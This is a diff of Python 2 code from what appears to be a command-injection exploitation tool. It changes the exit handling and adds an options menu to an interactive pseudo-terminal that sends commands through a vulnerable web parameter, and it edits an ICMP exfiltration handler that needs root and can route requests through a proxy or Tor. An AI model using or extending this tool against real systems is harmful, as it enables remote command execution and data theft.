@@ -55,7 +55,7 @@ def packet_handler(Packet):
 
 
 def signal_handler(signal, frame):
-  sys.exit(0)
+  os._exit(0)
 
 
 def snif(ip_dst, ip_src):
@@ -85,14 +85,21 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
 
 
 def input_cmd(http_request_method, url, vuln_parameter, ip_src):
-  print "\nPseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
+  print "\nPseudo-Terminal (type '?' for shell options)"
   while True:
     try:
       cmd = raw_input("Shell > ")
-      if cmd == "q":
-        logs.logs_notification(filename)
-        os._exit(0)
-      else: 
+      if cmd.lower() in settings.SHELL_OPTIONS:
+        if cmd.lower() == "?":
+          menu.shell_options()
+        elif cmd.lower() == "quit":
+          logs.logs_notification(filename)
+          os._exit(0)
+        elif cmd.lower() == "back":
+          os._exit(0)
+        else:
+          pass
+      else:
         cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
 
     except KeyboardInterrupt:
@@ -121,7 +128,7 @@ def icmp_exfiltration_handler(url, http_request_method):
   # You need to have root privileges to run this script
   if os.geteuid() != 0:
     print "\n" + Back.RED + "(x) Error:  You need to have root privileges to run this option." + Style.RESET_ALL
-    sys.exit(0)
+    os._exit(0)
 
   if http_request_method == "GET":
     url = parameters.do_GET_check(url)
@@ -143,7 +150,7 @@ def icmp_exfiltration_handler(url, http_request_method):
       response = proxy.use_proxy(request)
     except urllib2.HTTPError, err:
       print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-      raise SystemExit() 
+      os._exit(0)
 
   # Check if defined Tor.
   elif menu.options.tor:
@@ -151,14 +158,14 @@ def icmp_exfiltration_handler(url, http_request_method):
       response = tor.use_tor(request)
     except urllib2.HTTPError, err:
       print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-      raise SystemExit() 
+      os._exit(0)
 
   else:
     try:
       response = urllib2.urlopen(request)
     except urllib2.HTTPError, err:
       print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-      raise SystemExit() 
+      os._exit(0)
 
   ip_data = menu.options.ip_icmp_data
       
@@ -166,7 +173,7 @@ def icmp_exfiltration_handler(url, http_request_method):
   sys.stdout.write("(*) Testing the "+ technique + "... \n")
   sys.stdout.flush()
   
-  ip_src =  re.findall(r"ip_src=(.*), ", ip_data)
+  ip_src =  re.findall(r"ip_src=(.*),", ip_data)
   ip_src = ''.join(ip_src)
   
   ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
